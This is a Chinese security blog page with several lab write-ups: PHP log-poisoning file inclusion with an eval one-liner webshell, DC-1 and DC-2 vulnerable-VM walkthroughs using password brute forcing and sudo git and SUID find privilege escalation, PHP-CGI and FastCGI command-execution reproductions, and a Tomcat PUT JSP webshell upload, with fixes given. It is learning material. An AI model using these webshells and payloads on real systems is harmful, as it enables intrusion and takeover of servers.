<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
<p>客户端连接，获取一句话木马</p>
<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
<hr>
<p><strong>参考文章</strong>：<a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
<p>​                    <a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/dc-2-ba-ji-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/dc-2-ba-ji-xue-xi/" itemprop="url">DC-2靶机学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T11:05:39+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">靶机学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p>
<p>我们使用netdiscover进行主机发现。</p>
<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p>
<p>确定了靶机IP为192.168.153.136</p>
<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p>
<pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p>
<p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p>
<p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p>
<p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p>
<h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p>
<p>我们使用命令扫描网站内的用户名</p>
<pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p>
<p>获取到用户名后，我们思考能否爆破密码。</p>
<p>我们首先使用crel收集网页的信息</p>
<p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p>
<pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p>
<p>得到密码字典后我们继续回到wpscan进行密码爆破、</p>
<pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p>
<p>我们得到了两个登录的账号和密码。</p>
<h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p>
<p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p>
<p>我们翻译一下：</p>
<p>如果你不能利用WordPress并抄近路，还有别的办法。           </p>
<p>   希望你能找到另一个切入点。</p>
<h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p>
<p>可以登陆，ls一下可以看到flag3。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p>
<p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p>
<h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p>
<p>flag4 提示我们可以使用git，我们可以通过git来提权</p>
<p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p>
<p>我们可以利用suid 进行提权</p>
<p>SUID可以让调用者以文件拥有者的身份运行该文件</p>
<pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p>
<p>我们在root目录下找到最后一个flag。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/dc-1-ba-ji-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/dc-1-ba-ji-xue-xi/" itemprop="url">DC-1靶机学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T11:05:19+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">靶机学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt=""></p>
<p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p>
<h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p>
<p><code>nmap -sn 192.168.153.0/24</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt=""></p>
<p>2.使用netdiscover进行主机发现</p>
<p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt=""></p>
<p>3.使用arp-scan进行主机发现</p>
<p><code>arp-scan -l</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt=""></p>
<h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p>
<pre><code>nmap -A -p 1-65535 192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt=""></p>
<p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p>
<p>我们从浏览器访问该IP的80页面</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104045.png" alt=""></p>
<p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt=""></p>
<h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt=""></p>
<p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt=""></p>
<p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p>
<p>看到出现meterpreter证明成功入侵系统。</p>
<h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p>
<p>ls后发现目录下存在flag1.txt.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt=""></p>
<p>我们cat flag1.txt读取内容。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt=""></p>
<p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p>
<h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p>
<p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt=""></p>
<p>我们找到了flag2.txt并读取内容。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt=""></p>
<p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt=""></p>
<h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p>
<p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt=""></p>
<p>我们尝试使用john+hydra进行暴力破解。</p>
<pre><code>hydra -l flag4 -p/Users/john-1.8.0/run/password.lst ssh://192.168.153.150</code></pre><p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt=""></p>
<p>得到了flag4账号对应的密码为orange</p>
<p>我们使用kali ssh远程登录 </p>
<pre><code>ssh flag4@192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt=""></p>
<p>ls后发现flag4.txt文件，尝试cat读取。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt=""></p>
<p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p>
<p>可能我们需要提权。</p>
<h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p>
<p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p>
<p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p>
<p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt=""></p>
<p>发现find命令被设置为suid权限位</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt=""></p>
<p>之后我们通过find命令提权，使用whoami查看用户权限。</p>
<p>之后进入 root目录下查看最终的flag.</p>
<p><strong>完</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/" itemprop="url">其他中间件漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:49:25+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%85%B6%E4%BB%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
                    <span itemprop="name">其他中间件漏洞</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
<p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
<p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>使用vulhub实验环境，启动实验环境。</p>
<pre><code>cd /vulhub/fpm
docker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
<p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
<p>由于访问非*.PHP文件，所以返回结果403。</p>
<p>使用命令执行一个默认存在的 php 文件。</p>
<pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
<p>利用命令进行任意命令执行复现。</p>
<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;
python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;
python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>更改默认端口</p>
<h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
<p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
<p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
<p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>cgi模式下有如下一些参数可用：</p>
<pre><code>-c 指定php.ini文件的位置
-n 不要加载php.ini文件
-d 指定配置项
-b 启动fastcgi进程
-s 显示文件源码
-T 执行指定次该文件
-h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
<p>使用vulhub实验环境，启动环境。</p>
<p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
<p>抓包，修改包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p>
<p>命令成功执行。</p>
<p><strong>3、 漏洞修复</strong></p>
<p>三种方法：</p>
<p>1）升级php版本；（php-5.3.12以上版本）;</p>
<p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p>
<p>具体做法：</p>
<p>修改http.conf文件，找到<Directory/>增加以下三行</p>
<p>RewriteEngine on</p>
<p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p>
<p>RewriteRule ^(.*) $1? [L]</p>
<p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p>
<p>3）打上php补丁。</p>
<p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/tomcat-zhong-jian-jian-lou-dong/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/tomcat-zhong-jian-jian-lou-dong/" itemprop="url">Tomcat中间件漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:48:51+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
<p>tomcat文件夹下的/conf/web.xml文件插入：</p>
<pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p>
<p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p>
<pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p>
<p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p>
<p>弹出计算器：</p>
<p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
<p>2）更新并升级至最新版。</p>
